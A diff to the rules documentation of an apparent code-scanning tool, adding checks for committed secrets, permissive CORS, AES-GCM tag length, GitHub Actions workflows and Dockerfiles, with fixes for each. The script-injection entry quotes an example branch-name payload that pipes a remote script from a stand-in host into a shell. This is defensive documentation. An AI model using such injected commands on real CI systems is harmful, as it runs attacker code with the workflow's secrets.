@@ -15,7 +15,10 @@ with `--fail-on-quality`.
 |---|---|---|---|---|
 | [`secret/known-token`](#secretknown-token) | security | critical | CWE-798 | any |
 | [`secret/private-key`](#secretprivate-key) | security | critical | CWE-321 | any |
-| [`secret/hardcoded-password`](#secrethardcoded-password) | security | medium | CWE-798 | javascript, python |
+| [`secret/hardcoded-password`](#secrethardcoded-password) | security | medium | CWE-798 | any |
+| [`secret/jwt`](#secretjwt) | security | high | CWE-798 | any |
+| [`secret/auth-header`](#secretauth-header) | security | high | CWE-798 | any |
+| [`secret/env-file`](#secretenv-file) | security | high | CWE-538, CWE-798 | any |
 | [`js/sql-injection`](#jssql-injection) | security | medium | CWE-89 | javascript |
 | [`js/command-injection`](#jscommand-injection) | security | medium | CWE-78 | javascript |
 | [`js/code-injection`](#jscode-injection) | security | high | CWE-94, CWE-95 | javascript |
@@ -51,6 +54,16 @@ with `--fail-on-quality`.
 | [`js/sync-io-in-handler`](#jssync-io-in-handler) | quality | low | CWE-1050 | javascript |
 | [`py/http-no-timeout`](#pyhttp-no-timeout) | quality | medium | CWE-400 | python |
 | [`py/empty-except`](#pyempty-except) | quality | low | CWE-1069 | python |
+| [`js/cors-any-origin`](#jscors-any-origin) | security | medium | CWE-942 | javascript |
+| [`js/gcm-no-tag-length`](#jsgcm-no-tag-length) | security | medium | CWE-354 | javascript |
+| [`gha/script-injection`](#ghascript-injection) | security | medium | CWE-78, CWE-94 | github-actions |
+| [`gha/untrusted-checkout`](#ghauntrusted-checkout) | security | critical | CWE-829 | github-actions |
+| [`gha/unpinned-action`](#ghaunpinned-action) | security | medium | CWE-829 | github-actions |
+| [`gha/excessive-permissions`](#ghaexcessive-permissions) | security | medium | CWE-250 | github-actions |
+| [`docker/root-user`](#dockerroot-user) | security | medium | CWE-250 | dockerfile |
+| [`docker/curl-pipe-shell`](#dockercurl-pipe-shell) | security | medium | CWE-494 | dockerfile |
+| [`docker/add-remote`](#dockeradd-remote) | security | medium | CWE-494 | dockerfile |
+| [`docker/latest-tag`](#dockerlatest-tag) | quality | low | CWE-1357 | dockerfile |
 
 ### secret/known-token
 
@@ -68,7 +81,25 @@ Rotate the key pair and keep private keys out of source control (secret manager,
 
 **Hardcoded password or secret** — security, default severity `medium`, CWE-798.
 
-Read the value from configuration or a secret manager instead of the source code.
+Read the value from configuration or a secret manager instead of the source code. If it was ever pushed, rotate it.
+
+### secret/jwt
+
+**JSON Web Token committed to the repository** — security, default severity `high`, CWE-798.
+
+A JWT is a bearer credential: anyone holding it acts as its subject until it expires. Revoke the session/key that signed it and load tokens at runtime.
+
+### secret/auth-header
+
+**Credentials in an Authorization header** — security, default severity `high`, CWE-798.
+
+Replace the token with a variable (e.g. $TOKEN) in scripts and docs, and rotate the credential if it was real.
+
+### secret/env-file
+
+**.env file with real values committed** — security, default severity `high`, CWE-538, CWE-798.
+
+Remove the file from git (git rm --cached), add it to .gitignore, commit a .env.example with placeholders instead, and rotate every credential it contained.
 
 ### js/sql-injection
 
@@ -279,3 +310,63 @@ requests has no default timeout: a slow server hangs the worker forever. Pass ti
 **Error silently swallowed** — quality, default severity `low`, CWE-1069.
 
 Catch the specific exception you expect and log it, or explain in a comment why ignoring it is safe.
+
+### js/cors-any-origin
+
+**CORS allows any origin** — security, default severity `medium`, CWE-942.
+
+List the origins that may call the API (origin: ["https://app.example.com"]). Reflecting any origin together with credentials: true lets any website make authenticated requests as the user.
+
+### js/gcm-no-tag-length
+
+**AEAD decryption without a fixed tag length** — security, default severity `medium`, CWE-354.
+
+Pass { authTagLength: 16 } to createDecipheriv: without it Node accepts truncated authentication tags, which makes forging ciphertexts much easier.
+
+### gha/script-injection
+
+**Untrusted input interpolated into a workflow script** — security, default severity `medium`, CWE-78, CWE-94.
+
+${{ }} is pasted into the script before it runs, so a PR title or branch name like `"; curl evil.sh | sh #` becomes code. Pass the value through env: (VAR: ${{ github.event.pull_request.title }}) and use "$VAR" in the script.
+
+### gha/untrusted-checkout
+
+**pull_request_target checks out the PR's code** — security, default severity `critical`, CWE-829.
+
+pull_request_target runs with secrets and a write token; checking out the fork's head and running its build gives that code your secrets. Use pull_request, or split into an unprivileged build and a privileged workflow_run.
+
+### gha/unpinned-action
+
+**Third-party action not pinned to a commit** — security, default severity `medium`, CWE-829.
+
+Tags can be moved by the action's owner (or whoever compromises it). Pin to the full commit SHA and keep the tag as a comment: uses: owner/action@<40-char sha> # v2.1.0. Dependabot can keep pins updated.
+
+### gha/excessive-permissions
+
+**Workflow token with write-all permissions** — security, default severity `medium`, CWE-250.
+
+Grant only what the job needs, e.g. permissions: { contents: read, pull-requests: write }.
+
+### docker/root-user
+
+**Container runs as root** — security, default severity `medium`, CWE-250.
+
+Add a USER instruction with an unprivileged user in the final stage (or use a nonroot/distroless base image) so a compromised process doesn't get root in the container.
+
+### docker/curl-pipe-shell
+
+**Remote script piped into a shell during the build** — security, default severity `medium`, CWE-494.
+
+Download the script, verify its checksum or signature, then run it; or install from a package manager.
+
+### docker/add-remote
+
+**ADD downloads a remote file without a checksum** — security, default severity `medium`, CWE-494.
+
+Use ADD --checksum=sha256:... or download with curl and verify the hash before using the file.
+
+### docker/latest-tag
+
+**Base image without a pinned version** — quality, default severity `low`, CWE-1357.
+
+Pin a version (node:22.11-slim) or a digest (@sha256:...) so builds are reproducible and an upstream change can't slip into production unnoticed.
